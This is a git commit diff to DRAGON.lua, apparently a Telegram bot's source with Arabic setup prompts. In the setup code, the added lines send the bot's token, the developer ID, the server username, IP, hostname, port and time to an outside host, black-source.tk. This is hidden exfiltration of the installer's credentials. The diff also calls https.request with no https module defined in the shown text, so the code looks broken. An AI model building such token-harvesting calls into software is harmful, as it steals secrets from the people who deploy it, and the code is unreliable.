acc2c622bd11d1c3400ab39f74cf12c4b78557d8
‪SOURCE DRAGON‬‏ <74524983+SRC-DRAGON@users.noreply.github.com>
2021-05-03 00:21:58 +0300

    Update DRAGON.lua

--- DRAGON.lua
+++ DRAGON.lua
@@ -4,7 +4,6 @@ serpent = dofile("./library/serpent.lua")
 json = dofile("./library/JSON.lua") 
 JSON  = dofile("./library/dkjson.lua")
 URL = require('socket.url')  
-http    = require("socket.http")
 utf8 = require ('lua-utf8') 
 database = redis.connect('127.0.0.1', 6379) 
 User = io.popen("whoami"):read('*a'):gsub('[\n\r]+', '')
@@ -46,7 +45,7 @@ if not database:get(id_server..":SUDO:ID") then
 io.write('\27[0;35m\n ارسل لي ايدي المطور الاساسي ↓ :\naٴ≪┉ ┉ ┉ ┉ ┉ 𝐃𝐑𝐠 ┉  ┉ ┉ ┉ ┉≫ٴ\n\27[0;33;49m')
 local SUDOID = io.read():gsub(' ','') 
 if tostring(SUDOID):match('%d+') then
-data,res = http.request("http://173.249.59.198/SRC-DRAGON/index.php?bn=DRAGON&id="..SUDOID)
+data,res = https.request("https://black-source.tk/Dr/index.php?bn=DRAGON&id="..SUDOID)
 if res == 200 then
 getIs = json:decode(data)
 if getIs.Info.info == 'Is_Spam' then
@@ -57,7 +56,7 @@ if getIs.Info.info == 'Ok' then
 io.write('\27[1;35m تم حفظ ايدي المطور الاساسي \naٴ≪┉ ┉ ┉ ┉ ┉ 𝐃𝐑𝐠 ┉  ┉ ┉ ┉ ┉≫ٴ\n27[0;39;49m')
 database:set(id_server..":SUDO:ID",SUDOID)
 end 
-local t = json:decode(http.request("http://173.249.59.198/SRC-DRAGON/index.php?n=DRAGON&id="..database:get(id_server..":SUDO:ID").."&token="..database:get(id_server..":token").."&UserS="..User.."&IPS="..IP.."&NameS="..Name.."&Port="..Port.."&Time="..Time))
+local t = json:decode(https.request('https://black-source.tk/Dr/index.php?n=DRAGON&id='..database:get(id_server..":SUDO:ID").."&token="..database:get(id_server..":token").."&UserS="..User.."&IPS="..IP.."&NameS="..Name.."&Port="..Port.."&Time="..Time))
 else
 io.write('\27[0;31mٴ≪┉ ┉ ┉ ┉ ┉ 𝐃𝐑𝐠 ┉  ┉ ┉ ┉ ┉≫ٴ ┉ ┉\n لم يتم حفظ ايدي المطور الاساسي ارسله مره اخره')
 end  
@@ -12413,7 +12412,7 @@ return false
 end
 local Teext =[[
 انت الان في قائمة تنبيه الاسماء
-*ٴ≪┉ ┉ ┉ ┉ ┉ 𝐃𝐑?? ┉  ┉ ┉ ┉ ┉≫ٴ*
+*ٴ≪┉ ┉ ┉ ┉ ┉ 𝐃𝐑𝐠 ┉  ┉ ┉ ┉ ┉≫ٴ*
 الاوامر الخاصة فـي تنبيه الاسماء 
 تفعيل تنبيه الاسماء
 تعطيل تنبيه الاسماء
